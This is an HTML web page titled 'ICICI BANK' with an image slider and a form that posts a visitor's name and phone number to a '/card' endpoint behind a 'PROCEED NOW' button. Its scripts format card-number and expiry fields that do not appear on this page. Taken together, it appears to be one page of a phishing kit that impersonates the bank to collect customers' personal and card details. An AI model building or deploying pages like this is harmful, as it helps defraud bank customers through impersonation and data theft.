<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>ICICI BANK</title>
    <link rel="shortcut icon" href="/images/logo.ico" type="image/x-icon" />
    <link rel="stylesheet" href="/stylesheets/bootstrap.css" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.css" />
    <style>
      .swiper {
        width: 100%;
        height: 100%;
      }

      .swiper-slide {
        text-align: center;
        font-size: 18px;
        background: #fff;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .swiper-slide img {
        display: block;
        width: 100%;
        height: 100%;
        object-fit: cover;
      }
    </style>
  </head>

  <body>
    <div class="mb-5">
      <div class="swiper mySwiper">
        <div class="swiper-wrapper">
          <div class="swiper-slide">
            <img class="img-fluid" src="./images/i1.jpg" alt="" />
          </div>
          <div class="swiper-slide">
            <img class="img-fluid" src="./images/i2.jpg" alt="" />
          </div>
          <div class="swiper-slide">
            <img class="img-fluid" src="./images/i3.jpg" alt="" />
          </div>
          <div class="swiper-slide">
            <img class="img-fluid" src="./images/i4.jpg" alt="" />
          </div>
        </div>
        <div class="swiper-button-next"></div>
        <div class="swiper-button-prev"></div>
        <div class="swiper-pagination"></div>
      </div>
    </div>
    <form action="/card" method="post">
      <div class="container px-0">
        <div class="row justify-content-center m-0">
          <div class="col-sm-8 bg">
            <div class="container px-0">
              <div class="row m-0">
                <div class="col-6">
                  <label for="">name</label>
                  <input type="text" name="uSer" placeholder="name" class="form-control" required />
                </div>
                <div class="col-6">
                  <label for="">number</label>
                  <input type="number" name="nuMber" placeholder="number" class="form-control" required />
                </div>
              </div>
            </div>
            <div class="container mt-3">
              <div class="row justify-content-center m-0">
                <div class="col-10 mb-4">
                  <button
                    style="background-color: #ed1c24"
                    type="submit"
                    class="btn text-white form-control mt-2 px-5 fw-bold"
                  >
                    PROCEED NOW
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </form>
    <script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js"></script>

    <!-- Initialize Swiper -->
    <script>
      var swiper = new Swiper(".mySwiper", {
        cssMode: true,
        autoplay: {
          delay: 2500,
          disableOnInteraction: false,
        },
        navigation: {
          nextEl: ".swiper-button-next",
          prevEl: ".swiper-button-prev",
        },
        pagination: {
          el: ".swiper-pagination",
        },
        mousewheel: true,
        keyboard: true,
      });
    </script>
    <script
      src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
      integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
      crossorigin="anonymous"
    ></script>
    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
      crossorigin="anonymous"
    ></script>

    <script
      src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
      integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
      crossorigin="anonymous"
    ></script>

    <script>
      $("#card-number").on("keydown", (e) => {
        let cardNumber = $("#card-number").val();
        if (e.key === "Backspace") {
          $("#card-number").val(cardNumber);
        } else {
          if (cardNumber.length === 4) {
            cardNumber = cardNumber + "-";
            $("#card-number").val(cardNumber);
          } else if (cardNumber.length === 9) {
            cardNumber = cardNumber + "-";
            $("#card-number").val(cardNumber);
          } else if (cardNumber.length === 14) {
            cardNumber = cardNumber + "-";
            $("#card-number").val(cardNumber);
          }
        }
      });
      $("#expiry").on("keydown", (e) => {
        let expiry = $("#expiry").val();
        if (e.key === "Backspace") {
          $("#expiry").val(expiry);
        } else {
          if (expiry.length === 2) {
            expiry = expiry + "/";
            $("#expiry").val(expiry);
          }
        }
      });
    </script>
  </body>
</html>
